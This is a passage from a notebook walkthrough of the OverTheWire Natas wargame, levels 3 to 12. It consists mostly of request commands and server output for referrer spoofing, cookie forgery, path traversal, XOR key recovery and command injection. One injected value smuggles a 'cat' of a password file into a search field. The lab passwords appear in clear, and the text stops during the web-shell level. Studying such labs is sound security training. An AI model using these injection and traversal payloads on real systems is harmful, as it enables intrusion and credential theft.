    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -Lsr s3cr3t 03\n",
    "```\n",
    "```html\n",
    " <body>\n",
    "<h1>Index of /s3cr3t</h1>\n",
    "  <table>\n",
    "   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n",
    "   <tr><th colspan=\"5\"><hr></th></tr>\n",
    "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td> </td><td align=\"right\">  - </td><td> </td></tr>\n",
    "<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"users.txt\">users.txt</a></td><td align=\"right\">2023-10-05 06:15  </td><td align=\"right\"> 40 </td><td> </td></tr>\n",
    "   <tr><th colspan=\"5\"><hr></th></tr>\n",
    "</table>\n",
    "<address>Apache/2.4.52 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>\n",
    "</body></html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -Lr s3cr3t/users.txt 03\n",
    "```\n",
    "```\n",
    "natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas4 - referrer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 04\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas4</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\"\n",
    "<br/>\n",
    "<div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -se http://natas5.natas.labs.overthewire.org/ 04\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas4</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD\n",
    "<br/>\n",
    "<div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas5 - cookie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 05\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas5</h1>\n",
    "<div id=\"content\">\n",
    "Access disallowed. You are not logged in</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -I 05\n",
    "```\n",
    "```\n",
    "HTTP/1.1 200 OK\n",
    "Date: Fri, 29 Dec 2023 22:13:47 GMT\n",
    "Server: Apache/2.4.52 (Ubuntu)\n",
    "Set-Cookie: loggedin=0\n",
    "Content-Type: text/html; charset=UTF-8\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sb loggedin=1 05\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas5</h1>\n",
    "<div id=\"content\">\n",
    "Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas6 - form"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 06\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas6</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 06\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas6</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<?\n",
    "\n",
    "include \"includes/secret.inc\";\n",
    "\n",
    "    if(array_key_exists(\"submit\", $_POST)) {\n",
    "        if($secret == $_POST['secret']) {\n",
    "        print \"Access granted. The password for natas7 is <censored>\";\n",
    "    } else {\n",
    "        print \"Wrong secret\";\n",
    "    }\n",
    "    }\n",
    "?>\n",
    "\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -r includes/secret.inc 06\n",
    "```\n",
    "```php\n",
    "<?\n",
    "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sd secret=FOEIUWGHFEEUHOFUOIU\\&submit 06\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas6</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas7 - path traversal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 07\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas7</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<a href=\"index.php?page=home\">Home</a>\n",
    "<a href=\"index.php?page=about\">About</a>\n",
    "<br>\n",
    "<br>\n",
    "\n",
    "<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sp page=/etc/natas_webpass/natas8 07\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas7</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<a href=\"index.php?page=home\">Home</a>\n",
    "<a href=\"index.php?page=about\">About</a>\n",
    "<br>\n",
    "<br>\n",
    "a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB\n",
    "\n",
    "<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas8 - encoded data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 08\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas8</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 08\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas8</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<?\n",
    "\n",
    "$encodedSecret = \"3d3d516343746d4d6d6c315669563362\";\n",
    "\n",
    "function encodeSecret($secret) {\n",
    "    return bin2hex(strrev(base64_encode($secret)));\n",
    "}\n",
    "\n",
    "if(array_key_exists(\"submit\", $_POST)) {\n",
    "    if(encodeSecret($_POST['secret']) == $encodedSecret) {\n",
    "    print \"Access granted. The password for natas9 is <censored>\";\n",
    "    } else {\n",
    "    print \"Wrong secret\";\n",
    "    }\n",
    "}\n",
    "?>\n",
    "\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Decoding"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "python -c 'import base64; print(base64.decodebytes(bytes.fromhex(\"3d3d516343746d4d6d6c315669563362\")[::-1]))'\n",
    "```\n",
    "```python\n",
    "b'oubWYf2kBq'\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sd secret=oubWYf2kBq\\&submit 08\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas8</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd\n",
    "<form method=post>\n",
    "Input secret: <input name=secret><br>\n",
    "<input type=submit name=submit>\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas9 - command injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 09\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas9</h1>\n",
    "<div id=\"content\">\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 09\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas9</h1>\n",
    "<div id=\"content\">\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "<?\n",
    "$key = \"\";\n",
    "\n",
    "if(array_key_exists(\"needle\", $_REQUEST)) {\n",
    "    $key = $_REQUEST[\"needle\"];\n",
    "}\n",
    "\n",
    "if($key != \"\") {\n",
    "    passthru(\"grep -i $key dictionary.txt\");\n",
    "}\n",
    "?>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sd needle=\\;\\ cat\\ /etc/natas_webpass/natas10\\ \\#\\&submit=Search 09\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas9</h1>\n",
    "<div id=\"content\">\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas10 - command injection w/o special characters"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 10\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas10</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "For security reasons, we now filter on certain characters<br/><br/>\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 10\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas10</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "For security reasons, we now filter on certain characters<br/><br/>\n",
    "<form>\n",
    "Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>\n",
    "</form>\n",
    "\n",
    "\n",
    "Output:\n",
    "<pre>\n",
    "<?\n",
    "$key = \"\";\n",
    "\n",
    "if(array_key_exists(\"needle\", $_REQUEST)) {\n",
    "    $key = $_REQUEST[\"needle\"];\n",
    "}\n",
    "\n",
    "if($key != \"\") {\n",
    "    if(preg_match('/[;|&amp;]/',$key)) {\n",
    "        print \"Input contains an illegal character!\";\n",
    "    } else {\n",
    "        passthru(\"grep -i $key dictionary.txt\");\n",
    "    }\n",
    "}\n",
    "?>\n",
    "</pre>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh \\\n",
    "-sd needle=\\.\\*\\ /etc/natas_webpass/natas11\\&submit 10 \\\n",
    "| grep natas11\n",
    "```\n",
    "```\n",
    "/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas11 - xor cipher"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 11\n",
    "```\n",
    "```html\n",
    "<body style=\"background: #ffffff;\">\n",
    "Cookies are protected with XOR encryption<br/><br/>\n",
    "\n",
    "\n",
    "<form>\n",
    "Background color: <input name=bgcolor value=\"#ffffff\">\n",
    "<input type=submit value=\"Set color\">\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "</body>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 11\n",
    "```\n",
    "```html\n",
    "<?\n",
    "\n",
    "$defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\");\n",
    "\n",
    "function xor_encrypt($in) {\n",
    "    $key = '<censored>';\n",
    "    $text = $in;\n",
    "    $outText = '';\n",
    "\n",
    "    // Iterate through each character\n",
    "    for($i=0;$i<strlen($text);$i++) {\n",
    "    $outText .= $text[$i] ^ $key[$i % strlen($key)];\n",
    "    }\n",
    "\n",
    "    return $outText;\n",
    "}\n",
    "\n",
    "function loadData($def) {\n",
    "    global $_COOKIE;\n",
    "    $mydata = $def;\n",
    "    if(array_key_exists(\"data\", $_COOKIE)) {\n",
    "    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true);\n",
    "    if(is_array($tempdata) &amp;&amp; array_key_exists(\"showpassword\", $tempdata) &amp;&amp; array_key_exists(\"bgcolor\", $tempdata)) {\n",
    "        if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) {\n",
    "        $mydata['showpassword'] = $tempdata['showpassword'];\n",
    "        $mydata['bgcolor'] = $tempdata['bgcolor'];\n",
    "        }\n",
    "    }\n",
    "    }\n",
    "    return $mydata;\n",
    "}\n",
    "\n",
    "function saveData($d) {\n",
    "    setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d))));\n",
    "}\n",
    "\n",
    "$data = loadData($defaultdata);\n",
    "\n",
    "if(array_key_exists(\"bgcolor\",$_REQUEST)) {\n",
    "    if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) {\n",
    "        $data['bgcolor'] = $_REQUEST['bgcolor'];\n",
    "    }\n",
    "}\n",
    "\n",
    "saveData($data);\n",
    "\n",
    "\n",
    "\n",
    "?>\n",
    "\n",
    "<h1>natas11</h1>\n",
    "<div id=\"content\">\n",
    "<body style=\"background: <?=$data['bgcolor']?>;\">\n",
    "Cookies are protected with XOR encryption<br/><br/>\n",
    "\n",
    "<?\n",
    "if($data[\"showpassword\"] == \"yes\") {\n",
    "    print \"The password for natas12 is <censored><br>\";\n",
    "}\n",
    "\n",
    "?>\n",
    "\n",
    "<form>\n",
    "Background color: <input name=bgcolor value=\"<?=$data['bgcolor']?>\">\n",
    "<input type=submit value=\"Set color\">\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### PHP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "<?\n",
    "//-----[ 0 ] plaintext\n",
    "$defaultdata = array('showpassword'=>'no','bgcolor'=>'#ffffff');\n",
    "\n",
    "//-----[ 3,6 ] ciphertext = plaintext xor key\n",
    "function xor_encrypt ($in) {\n",
    "  // where is the key?\n",
    "  $key     = '<censored>';\n",
    "  // plaintext\n",
    "  $text    = $in;\n",
    "  $outText = '';\n",
    "  // .= string concatenation\n",
    "  //  ^ bitwise xor\n",
    "  //\n",
    "  // if len(key) < len(plaintext) then the key will repeat:\n",
    "  // for example,\n",
    "  // if len(key) = 4 and len(plaintext = 10) then\n",
    "  // 0 % 4, 1 % 4, 2 % 4, 3 % 4,\n",
    "  // 4 % 4, 5 % 4, 6 % 4, 7 % 4, ...\n",
    "  for ($i=0; $i<strlen($text); $i++) {\n",
    "    $outText .= $text[$i] ^ $key[$i % strlen($key)];\n",
    "    //                      ^^^^^^^^^^^^^^^^^^^^^^^\n",
    "  }\n",
    "  return $outText;\n",
    "}\n",
    "\n",
    "//-----[ 2 ]\n",
    "function loadData ($def) {\n",
    "  global $_COOKIE;\n",
    "  $mydata = $def;\n",
    "\n",
    "  if (array_key_exists('data', $_COOKIE)) {\n",
    "    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true);\n",
    "\n",
    "    if (\n",
    "                    is_array($tempdata)                               // $tempdata is an array\n",
    "         &amp;&amp; array_key_exists('showpassword', $tempdata)       // with key `showpassword` and\n",
    "         &amp;&amp; array_key_exists('bgcolor',      $tempdata)       // with key `bgcolor`\n",
    "       )\n",
    "    {\n",
    "      if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { // key `bgcolor` has a color value in hex format\n",
    "        $mydata['showpassword'] = $tempdata['showpassword'];\n",
    "        $mydata['bgcolor']      = $tempdata['bgcolor'];\n",
    "      }\n",
    "    }\n",
    "  }\n",
    "  return $mydata;\n",
    "}\n",
    "\n",
    "//-----[ 5 ]\n",
    "function saveData ($d) {\n",
    "  setcookie('data', base64_encode(xor_encrypt(json_encode($d))));\n",
    "}\n",
    "\n",
    "//-----[ 1 ] set cookie values otherwise set default values\n",
    "$data = loadData($defaultdata);\n",
    "\n",
    "//-----[ 3 ] set bgcolor based on user browser input\n",
    "if (array_key_exists('bgcolor',$_REQUEST)) {\n",
    "  if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) {\n",
    "    $data['bgcolor'] = $_REQUEST['bgcolor'];\n",
    "  }\n",
    "}\n",
    "\n",
    "//-----[ 4 ]\n",
    "saveData($data);\n",
    "\n",
    "?>\n",
    "\n",
    "<?\n",
    "\n",
    "if ($data['showpassword']=='yes') {\n",
    "  print 'The password for natas12 is <censored><br>';\n",
    "}\n",
    "\n",
    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Obtaining the encryption key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -I 11\n",
    "```\n",
    "```\n",
    "HTTP/1.1 200 OK\n",
    "Date: Fri, 29 Dec 2023 22:56:23 GMT\n",
    "Server: Apache/2.4.52 (Ubuntu)\n",
    "Set-Cookie: data=MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D\n",
    "Content-Type: text/html; charset=UTF-8\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "php -a # interactive php\n",
    "```\n",
    "```php\n",
    "<?\n",
    "// ciphertext\n",
    "$cookie=base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY');\n",
    "\n",
    "function xorcipher ($in) {\n",
    "  if ($in != '') {\n",
    "    // let's reverse the xor cipher (i.e., take advantage of its associativity) to get the key\n",
    "    // key = ciphertext xor plaintext\n",
    "    // here, $key stores the plaintext\n",
    "    $key = json_encode(array('showpassword'=>'no', 'bgcolor'=>'#ffffff'));\n",
    "  }\n",
    "  else {\n",
    "    // now we have the key!\n",
    "    // passwd12 = plaintext(showpassword=yes) xor key\n",
    "    $key = 'KNHL';\n",
    "    $in  = json_encode(array('showpassword'=>'yes','bgcolor'=>'#ffffff'));\n",
    "  }\n",
    "  $out = '';\n",
    "  for ($i=0; $i<strlen($in); $i++) {\n",
    "    $out .= $in[$i] ^ $key[$i % strlen($key)];\n",
    "  }\n",
    "  return $out;\n",
    "}\n",
    "\n",
    "print xorcipher($cookie);           // KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK\n",
    "print base64_encode(xorcipher('')); // MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz\n",
    "?>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Success"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sb data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz 11\n",
    "```\n",
    "```html\n",
    "<h1>natas11</h1>\n",
    "<div id=\"content\">\n",
    "<body style=\"background: #ffffff;\">\n",
    "Cookies are protected with XOR encryption<br/><br/>\n",
    "\n",
    "The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG<br>\n",
    "<form>\n",
    "Background color: <input name=bgcolor value=\"#ffffff\">\n",
    "<input type=submit value=\"Set color\">\n",
    "</form>\n",
    "\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Natas12 - web shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -s 12\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas12</h1>\n",
    "<div id=\"content\">\n",
    "\n",
    "<form enctype=\"multipart/form-data\" action=\"index.php\" method=\"POST\">\n",
    "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000\" />\n",
    "<input type=\"hidden\" name=\"filename\" value=\"qkzplps5hk.jpg\" />\n",
    "Choose a JPEG to upload (max 1KB):<br/>\n",
    "<input name=\"uploadedfile\" type=\"file\" />\n",
    "\n",
    "<input type=\"submit\" value=\"Upload File\" />\n",
    "</form>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Page Source"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "bash natas.sh -sr index-source.html 12\n",
    "```\n",
    "```html\n",
    "<body>\n",
    "<h1>natas12</h1>\n",
    "<div id=\"content\">\n",
    "<?php\n",
    "\n",
    "function genRandomString() {\n",
    "    $length = 10;\n",
    "    $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\";\n",
    "    $string = \"\";\n",
    "\n",
    "    for ($p = 0; $p < $length; $p++) {\n",
    "        $string .= $characters[mt_rand(0, strlen($characters)-1)];\n",
    "    }\n",
    "\n",
    "    return $string;\n",
    "}\n",
    "\n",
    "function makeRandomPath($dir, $ext) {\n",
    "    do {\n",
    "    $path = $dir.\"/\".genRandomString().\".\".$ext;\n",
    "    } while(file_exists($path));\n",
    "    return $path;\n",
    "}\n",
    "\n",
    "function makeRandomPathFromFilename($dir, $fn) {\n",
    "    $ext = pathinfo($fn, PATHINFO_EXTENSION);\n",
    "    return makeRandomPath($dir, $ext);\n",
    "}\n",
    "\n",
    "if(array_key_exists(\"filename\", $_POST)) {\n",
    "    $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]);\n",
    "\n",
    "\n",
    "        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {\n",
    "        echo \"File is too big\";\n",
    "    } else {\n",
    "        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {\n",
    "            echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\";\n",
    "        } else{\n",
    "            echo \"There was an error uploading the file, please try again!\";\n",
    "        }\n",
    "    }\n",
    "} else {\n",
    "?>\n",
    "\n",
    "<form enctype=\"multipart/form-data\" action=\"index.php\" method=\"POST\">\n",
    "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000\" />\n",
    "<input type=\"hidden\" name=\"filename\" value=\"<?php print genRandomString(); ?>.jpg\" />\n",
    "Choose a JPEG to upload (max 1KB):<br/>\n",
    "<input name=\"uploadedfile\" type=\"file\" />\n",
    "\n",
    "<input type=\"submit\" value=\"Upload File\" />\n",
    "</form>\n",
    "<?php } ?>\n",
    "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
    "</div>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### PHP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```php\n",
    "<?php\n",
    "\n",
    "// generate a random 10-character alphanumeric string\n",
    "function genRandomString () {\n",
    "  $length     = 10;\n",
    "  $characters = '0123456789abcdefghijklmnopqrstuvwxyz';\n",
    "  $string     = '';\n",
    "\n",
    "  for ($p = 0; $p < $length; $p++) {\n",
    "    $string .= $characters[mt_rand(0, strlen($characters)-1)];\n",
    "  }\n",
    "\n",
    "  return $string;\n",
    "}\n",
    "\n",
    "function makeRandomPath ($dir, $ext) {\n",
    "  do {\n",
    "    $path = $dir.\"/\".genRandomString().\".\".$ext;\n",
    "  } while(file_exists($path));\n",
    "  return $path;\n",
    "}\n",
    "\n",
    "function makeRandomPathFromFilename ($dir, $fn) {\n",
    "  $ext = pathinfo($fn, PATHINFO_EXTENSION);\n",
    "  return makeRandomPath($dir, $ext);\n",
    "}\n",
    "\n",
    "if (array_key_exists(\"filename\", $_POST)) {\n",
    "  $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]);\n",
    "\n",
    "  if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {\n",
    "    echo \"File is too big\";\n",
    "  } else {\n",
    "    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {\n",
    "      echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\";\n",
    "    } else {\n",
    "      echo \"There was an error uploading the file, please try again!\";\n",
    "    }\n",
    "  }\n",
    "} else {\n",
    "\n",
    "?>\n",
    "\n",
    "<?php\n",
    "\n",
    "}\n",
    "\n",
